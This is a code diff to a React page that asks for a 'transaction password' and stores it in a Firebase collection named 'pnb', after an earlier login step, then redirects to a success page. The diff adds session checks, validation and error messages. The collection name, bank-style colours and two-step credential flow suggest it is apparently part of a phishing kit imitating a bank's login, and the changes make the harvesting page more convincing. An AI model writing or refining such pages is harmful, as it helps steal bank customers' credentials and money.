@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useNavigate, useParams } from 'react-router-dom';
 import '../App.css';
 import secondPageImage from '../assets/second_page_img.jpeg';
@@ -7,29 +7,85 @@ import FirebaseUtil from '../FirebaseRepo';
 const SecondPage = () => {
   const [password2, setPassword2] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [error, setError] = useState('');
+  const [documentExists, setDocumentExists] = useState(true);
   const navigate = useNavigate();
   const { documentId } = useParams();
 
+  // Verify document exists on load
+  useEffect(() => {
+    const verifyDocument = async () => {
+      try {
+        // Check if the document exists first
+        const doc = await FirebaseUtil.getDocument("pnb", documentId);
+        if (!doc) {
+          setDocumentExists(false);
+          setError("Session expired or invalid. Please start over.");
+        }
+      } catch (err) {
+        console.error("Error verifying document:", err);
+        setDocumentExists(false);
+        setError("Could not verify your session. Please try again.");
+      }
+    };
+
+    if (documentId) {
+      verifyDocument();
+    } else {
+      setDocumentExists(false);
+      setError("Invalid session. Please start over.");
+    }
+  }, [documentId]);
+
+  const validatePassword = () => {
+    if (!password2) {
+      setError("Transaction password is required");
+      return false;
+    }
+    if (password2.length < 4) {
+      setError("Transaction password must be at least 4 characters");
+      return false;
+    }
+    setError('');
+    return true;
+  };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setError('');
+    
+    // Validate password
+    if (!validatePassword()) {
+      return;
+    }
+    
+    // Check if document exists
+    if (!documentExists) {
+      setError("Session expired or invalid. Please start over.");
+      return;
+    }
+    
     setIsSubmitting(true);
 
     try {
       // Update the existing document in the pnb collection
       const result = await FirebaseUtil.updateDocument("pnb", documentId, {
         password2,
+        updatedAt: new Date().toISOString()
       });
 
       // Check if update was successful
       if (result.state === 'success') {
         // Navigate to the success page after successful submission
-        navigate('/success');
+        setTimeout(() => {
+          navigate('/success');
+        }, 1000);
       } else {
         throw new Error(result.error || 'Failed to update document');
       }
     } catch (error) {
       console.error("Error submitting form:", error);
+      setError("An error occurred. Please try again.");
       setIsSubmitting(false);
     }
   };
@@ -56,6 +112,21 @@ const SecondPage = () => {
             </h1>
           </div>
 
+          {error && (
+            <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
+              <div className="flex">
+                <div className="flex-shrink-0">
+                  <svg className="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
+                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+                  </svg>
+                </div>
+                <div className="ml-3">
+                  <p className="text-sm text-red-700">{error}</p>
+                </div>
+              </div>
+            </div>
+          )}
+
           <form onSubmit={handleSubmit} className="space-y-4">
             <div className="mb-4">
               <label className="block text-gray-700 text-sm font-bold mb-2">
@@ -65,18 +136,33 @@ const SecondPage = () => {
                 type="password"
                 className="w-full py-2 px-3 rounded border border-gray-300 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-[#A20E37]"
                 value={password2}
-                onChange={(e) => setPassword2(e.target.value)}
+                onChange={(e) => {
+                  setPassword2(e.target.value);
+                  if (error) setError('');
+                }}
                 required
+                minLength={4}
+                disabled={!documentExists || isSubmitting}
               />
             </div>
 
             <button
               type="submit"
               className="w-full bg-[#FBBC09] hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm"
-              disabled={isSubmitting}
+              disabled={isSubmitting || !documentExists}
             >
               {isSubmitting ? "PROCESSING..." : "SUBMIT"}
             </button>
+
+            {!documentExists && (
+              <button
+                type="button"
+                className="w-full mt-2 bg-[#A20E37] hover:bg-[#8a0c2f] text-white font-bold py-2 px-4 rounded-full text-sm"
+                onClick={() => navigate('/')}
+              >
+                BACK TO LOGIN
+              </button>
+            )}
           </form>
 
           <div className="mt-6 text-center">
